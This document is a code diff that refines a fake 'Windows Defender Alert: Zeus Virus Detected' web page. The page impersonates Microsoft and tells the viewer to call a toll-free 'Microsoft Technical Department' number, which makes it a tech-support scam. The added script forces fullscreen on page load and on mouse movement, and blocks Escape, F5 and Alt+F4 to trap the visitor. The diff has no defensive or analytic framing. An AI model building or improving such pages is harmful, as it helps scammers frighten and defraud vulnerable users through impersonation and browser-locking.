@@ -7,38 +7,44 @@
     <style>
         /* Global Styles */
         body {
-            background-color: #0078D7;
             font-family: 'Segoe UI', Arial, sans-serif;
-            color: #FFFFFF;
+            background-color: #0078D7;
             margin: 0;
             padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #FFFFFF;
         }
 
         .container {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            height: 100vh;
+            width: 80%;
+            max-width: 600px;
             padding: 20px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
         }
 
         .content {
             flex: 1;
+            margin-right: 20px;
         }
 
         .content h1 {
             font-size: 24px;
-            font-weight: bold;
             margin-bottom: 10px;
         }
 
-        .content h2 {
-            font-size: 18px;
+        .content p {
             margin-bottom: 20px;
         }
 
         .list {
-            font-size: 16px;
             margin-bottom: 20px;
         }
 
@@ -52,12 +58,7 @@
             margin-bottom: 10px;
         }
 
-        .description {
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-
-        .call-to-action {
+        .call-action {
             font-size: 18px;
             font-weight: bold;
             margin-bottom: 20px;
@@ -66,7 +67,6 @@
         .windows-logo {
             width: 100px;
             height: 100px;
-            margin-left: 20px;
         }
     </style>
 </head>
@@ -74,7 +74,7 @@
     <div class="container">
         <div class="content">
             <h1>Windows Defender Alert : Zeus Virus Detected In Your Computer !!</h1>
-            <h2>Please Do Not Shut Down or Reset Your Computer.</h2>
+            <p>Please Do Not Shut Down or Reset Your Computer.</p>
             <div class="list">
                 <p>The following data will be compromised if you continue:</p>
                 <ul>
@@ -84,31 +84,44 @@
                     <li>Local Hard Disk Files</li>
                 </ul>
             </div>
-            <div class="description">
-                <p>The Zeus virus is a type of malware that steals identity and credit card information. If you continue to use your computer, further action may reveal private information.</p>
-            </div>
-            <div class="call-to-action">
-                Call Microsoft Technical Department: <a href="tel:8882027560">(888) 202-7560 (Toll Free)</a>
-            </div>
+            <p>The Zeus virus is a type of malware designed to steal your identity and credit card information. Further action may reveal more of your private information.</p>
+            <p class="call-action">Call Microsoft Technical Department: <a href="tel:8882027560">(888) 202-7560 (Toll Free)</a></p>
         </div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Windows_logo_-_2022.svg/1200px-Windows_logo_-_2022.svg.png" alt="Windows Logo" class="windows-logo">
+        <img class="windows-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Windows_logo_-_2021.svg/1200px-Windows_logo_-_2021.svg.png" alt="Windows Logo">
     </div>
 
     <script>
-        // Prevent closing the browser tab or window using standard UI elements
-        window.onbeforeunload = function() {
-            return "";
-        };
+        // Auto Full Screen on page load
+        document.addEventListener("DOMContentLoaded", function () {
+            document.body.requestFullscreen();
+        });
 
-        document.addEventListener("keydown", function(event) {
-            if (event.key === "F5") {
-                event.preventDefault();
+        // Mouse Move Full Screen
+        document.addEventListener("mousemove", function () {
+            document.body.requestFullscreen();
+        });
+
+        // Block UI Closing
+        document.addEventListener("keydown", function (e) {
+            if (e.key === "Escape" || e.key === "Esc") {
+                e.preventDefault();
             }
         });
 
-        window.onkeydown = function(event) {
-            if (event.ctrlKey && event.altKey && event.key === "Delete") {
-                window.close();
+        window.onbeforeunload = function () {
+            return "";
+        };
+
+        document.onkeydown = function (e) {
+            if (e.key === "F5") {
+                e.preventDefault();
+            }
+            if (e.altKey && e.key === "F4") {
+                e.preventDefault();
+            }
+            if (e.ctrlKey && e.key === "Alt" && e.key === "Delete") {
+                // Allow closing with Ctrl + Alt + Delete
+                return;
             }
         };
     </script>
